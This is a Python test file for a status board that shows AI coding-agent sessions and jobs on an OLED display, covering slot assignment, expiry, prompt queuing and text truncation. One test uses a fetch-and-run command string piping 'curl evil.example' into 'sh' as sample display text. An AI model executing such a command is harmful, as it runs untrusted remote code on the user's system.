from frostbite_host.device import OLED_COLS, Status
from frostbite_host.state import Board, fit_lr


def test_first_free_slot_and_stable_assignment():
    b = Board()
    assert b.update("claude:a", "claude", 0, name="a", status=Status.RUN) == 0
    assert b.update("claude:b", "claude", 0, name="b", status=Status.RUN) == 1
    assert b.update("claude:a", "claude", 1, status=Status.NEEDS) == 0
    b.free("claude:a")
    assert b.update("claude:c", "claude", 2, name="c") == 0   # first free again
    assert b.statuses() == [Status.IDLE, Status.RUN] + [Status.IDLE] * 4


def test_done_lingers_ten_minutes_then_frees():
    b = Board()
    b.update("train:x", "train", 0, name="x", status=Status.RUN)
    b.update("train:x", "train", 100, status=Status.DONE)
    assert not b.expire(100 + 599)
    assert b.slots[0].status is Status.DONE
    assert b.expire(100 + 600)
    assert b.slots[0] is None


def test_update_while_done_keeps_since_unless_status_changes():
    b = Board()
    b.update("k", "ctl", 0, status=Status.DONE)
    b.update("k", "ctl", 500, status=Status.DONE, detail="still done")
    assert b.expire(600)          # since is still 0


def test_full_board_evicts_oldest_lingering_then_refuses():
    b = Board()
    for i in range(6):
        b.update(f"k{i}", "ctl", i, status=Status.RUN)
    b.update("k3", "ctl", 10, status=Status.DONE)
    b.update("k1", "ctl", 20, status=Status.DONE)
    assert b.update("new", "ctl", 30, status=Status.RUN) == 3   # oldest done
    assert b.update("new2", "ctl", 31, status=Status.RUN) == 1
    assert b.update("new3", "ctl", 32, status=Status.RUN) is None  # all busy


def test_explicit_slot_replaces():
    b = Board()
    b.update("claude:a", "claude", 0, status=Status.RUN)
    assert b.apply({"op": "set_slot", "slot": 0, "status": "run", "name": "CI build"}, 1)
    assert b.slots[0].key == "slot:1" and b.slots[0].name == "CI build"
    assert b.find("claude:a") is None


def test_needs_detail_uses_last_tool():
    b = Board()
    b.apply({"op": "update", "key": "claude:s", "source": "claude", "name": "my-app",
             "status": "run", "detail": "Bash(npm test)", "tool": "Bash(npm test)"}, 0)
    b.apply({"op": "update", "key": "claude:s", "status": "needs", "tool_hint": "Bash"}, 1)
    assert b.slots[0].detail == "Bash(npm test)?"
    b.answer(0, 2, status=Status.RUN, detail="approved")
    b.apply({"op": "update", "key": "claude:s", "status": "needs", "tool_hint": "Edit"}, 100)
    assert b.slots[0].detail == "Edit?"


def _ask(tool, **kw):
    return {"op": "update", "source": "claude", "key": "claude:s", "name": "n", "status": "needs",
            "detail": tool + "?", "tool": tool, **kw}


def test_prompts_close_by_tool_and_agent():
    b = Board()
    b.apply(_ask("Bash(a)", agent="s1"), 0)
    b.apply(_ask("Bash(b)", agent="s2"), 1)
    run = {"op": "update", "key": "claude:s", "status": "run"}
    b.apply({**run, "resolve": {"tool": "Bash(a)", "agent": "s2"}}, 2)   # same tool, other agent
    assert b.slots[0].status is Status.NEEDS and len(b.slots[0].pending) == 2
    b.apply({**run, "resolve": {"tool": "Bash(a)", "agent": "s1"}}, 3)
    assert b.slots[0].status is Status.NEEDS and b.slots[0].detail == "Bash(b)?"
    b.apply({**run, "resolve": {"tool": "Bash(b)", "agent": "s2"}}, 4)
    assert b.slots[0].status is Status.RUN and b.slots[0].detail == "Bash(b)"


def test_notification_after_the_answer_does_not_raise_needs_again():
    b = Board()
    b.apply(_ask("Bash(a)"), 0)
    b.answer(0, 2, status=Status.RUN, detail="approved")
    note = {"op": "update", "key": "claude:s", "status": "needs", "tool_hint": "Bash", "notification": True}
    b.apply(note, 6)
    assert b.slots[0].status is Status.RUN
    b.apply(note, 60)                     # long after: a real prompt with no PermissionRequest
    assert b.slots[0].status is Status.NEEDS


def test_prompt_raised_by_a_notification_closes_when_its_tool_finishes():
    b = Board()
    b.apply({"op": "update", "source": "claude", "key": "claude:s", "name": "n", "status": "run",
             "detail": "Bash(a)", "tool": "Bash(a)"}, 0)
    note = {"op": "update", "key": "claude:s", "status": "needs", "tool_hint": "Bash", "notification": True}
    run = {"op": "update", "key": "claude:s", "status": "run"}
    b.apply(note, 1)
    b.apply({**run, "resolve": {"tool": "Read(x)", "agent": None}}, 2)
    assert b.slots[0].status is Status.NEEDS
    b.apply({**run, "resolve": {"tool": "Bash(a)", "agent": "s1"}}, 3)
    assert b.slots[0].status is Status.RUN


def test_notification_adds_nothing_to_an_open_prompt():
    b = Board()
    b.apply(_ask("Bash(a)"), 0)
    b.apply({"op": "update", "key": "claude:s", "status": "needs", "tool_hint": "Bash", "notification": True}, 6)
    assert len(b.slots[0].pending) == 1


def test_stop_and_new_prompt_close_everything():
    for msg in ({"op": "update", "key": "claude:s", "status": "done", "clears": True},
                {"op": "update", "key": "claude:s", "status": "run", "clears": True}):
        b = Board()
        b.apply(_ask("Bash(a)"), 0)
        b.apply(msg, 1)
        assert b.slots[0].pending == [] and b.slots[0].status is not Status.NEEDS


def test_idle_notification_keeps_an_open_prompt():
    b = Board()
    b.apply(_ask("Bash(a)"), 0)
    b.apply({"op": "update", "key": "claude:s", "status": "done", "detail": "waiting for input"}, 70)
    assert b.slots[0].status is Status.NEEDS


def test_question_is_not_queued_twice():
    b = Board()
    q = _ask("AskUserQuestion", kind="question")
    b.apply(q, 0)
    b.apply(q, 1)
    assert len(b.slots[0].pending) == 1


def test_quiet_run_goes_idle_then_frees():
    b = Board()
    b.apply({"op": "update", "source": "claude", "key": "claude:x", "name": "n", "status": "run"}, 0)
    assert not b.expire(899)
    assert b.expire(900)
    assert b.slots[0].status is Status.IDLE and b.slots[0].detail == "quiet 15m"
    assert b.expire(24 * 3600)
    assert b.slots[0] is None


def test_a_tool_in_flight_stays_running_longer_and_is_not_evicted():
    b = Board()
    b.apply({"op": "update", "source": "claude", "key": "claude:x", "name": "n", "status": "run",
             "detail": "Bash(x)", "tool": "Bash(x)"}, 0)
    b.expire(3599)
    assert b.slots[0].status is Status.RUN
    b.expire(3600)
    assert b.slots[0].status is Status.IDLE and b.slots[0].tool_open is True


def test_a_slot_nobody_can_answer_stops_being_amber():
    b = Board()
    b.apply(_ask("Bash(a)"), 0)
    assert not b.expire(1799)
    assert b.expire(1800)
    assert b.slots[0].status is Status.IDLE and b.slots[0].pending == []


def test_finished_slot_on_a_reused_tty_is_freed():
    b = Board()
    t = {"bundle": "com.apple.Terminal", "tty": "/dev/ttys001"}
    b.update("claude:old", "claude", 0, status=Status.DONE, terminal=t)
    b.update("claude:new", "claude", 1, status=Status.RUN, terminal=t)
    assert b.find("claude:old") is None and b.find("claude:new") is not None


def test_failed_tty_lookup_drops_the_old_tty():
    b = Board()
    b.update("claude:a", "claude", 0, status=Status.RUN, terminal={"bundle": "b", "tty": "/dev/ttys001"})
    b.update("claude:a", "claude", 1, terminal={"bundle": "b", "tty": ""})
    assert b.slots[0].terminal == {"bundle": "b"}


def test_long_prompt_pages_through_the_whole_text():
    b = Board()
    text = "Bash(npm test && curl evil.example | sh)?"
    b.apply({"op": "update", "source": "claude", "key": "claude:s", "name": "n", "status": "needs",
             "detail": text, "tool": text[:-1]}, 0)
    seen = [b.oled_lines(t)[1] for t in (0, 2, 4, 6)]
    assert all(len(line) <= 21 for line in seen)
    assert "".join(line.rstrip(">") for line in seen[:3]) == text
    assert seen[3] == seen[0]


def test_clock_step_back_does_not_stretch_linger():
    b = Board()
    b.update("k", "ctl", 10000, status=Status.DONE)
    b.expire(5000)
    assert b.expire(5000 + 600)


def test_overflow_clears_and_expires():
    b = Board()
    for i in range(6):
        b.update(f"c{i}", "claude", 0, status=Status.RUN)
    msg = {"op": "update", "source": "claude", "key": "c6", "name": "n", "status": "needs"}
    assert not b.apply(msg, 1)
    assert b.glow()[:3] == (0xFF, 0xB0, 0x20)
    b.free("c0")
    assert b.apply(msg, 2) and not b.overflow
    b.free("c6")
    b.update("c0", "claude", 3, status=Status.RUN)
    assert not b.apply(msg, 3)
    b.expire(3 + 3600)
    assert not b.overflow


def test_long_project_names_use_the_short_label():
    b = Board()
    b.update("claude:x", "claude", 0, name="frostbite-firmware", status=Status.RUN)
    assert b.oled_lines(0)[0] == "c#1 fros~firmware RUN"


def test_oled_lines_claude_example():
    b = Board()
    b.update("claude:x", "claude", 0, name="my-app", status=Status.RUN)
    b.update("claude:y", "claude", 0, name="my-app", status=Status.NEEDS,
             detail="Bash(npm test)?")
    b.select(1)
    l0, l1 = b.oled_lines(5)
    assert l0 == "claude#2 my-app  WAIT"
    assert len(l0) == OLED_COLS
    assert l1 == "Bash(npm test)?"


def test_oled_truncation_and_ascii():
    b = Board()
    b.update("t", "train", 0, name="a-very-long-training-run-name", status=Status.ERROR,
             detail="RuntimeError: MPS backend out of memory — très long")
    l0, l1 = b.oled_lines(0)
    for line in (l0, l1):
        assert len(line) <= OLED_COLS
        assert all(0x20 <= ord(c) <= 0x7E for c in line)
    assert l0.endswith(" ERR")
    assert l1 == "RuntimeError: MPS bac"


def test_empty_slot_shows_summary_and_flash():
    b = Board()
    b.update("a", "ctl", 0, status=Status.RUN)
    b.update("b", "ctl", 0, status=Status.NEEDS)
    b.select(4)
    assert b.oled_lines(0) == ("#5 empty", "1 wait 1 run")
    b.flash("focus the terminal", 10)
    assert b.oled_lines(11)[1] == "focus the terminal"
    assert b.oled_lines(14)[1] == "1 wait 1 run"


def test_fit_lr():
    assert fit_lr("abc", "RUN") == "abc".ljust(17) + " RUN"
    assert len(fit_lr("x" * 40, "DONE")) == 21
    assert fit_lr("x" * 40, "DONE").endswith("x DONE")
    assert fit_lr("c#1 frostbite-firmware", "WAIT") == "c#1 fros~irmware WAIT"


def test_glow_worst_status():
    b = Board()
    assert b.glow()[3] == 50
    b.update("a", "ctl", 0, status=Status.NEEDS)
    assert b.glow()[:3] == (0xFF, 0xB0, 0x20)
    b.update("b", "ctl", 0, status=Status.ERROR)
    assert b.glow()[:3] == (0xFF, 0x4D, 0x4F)
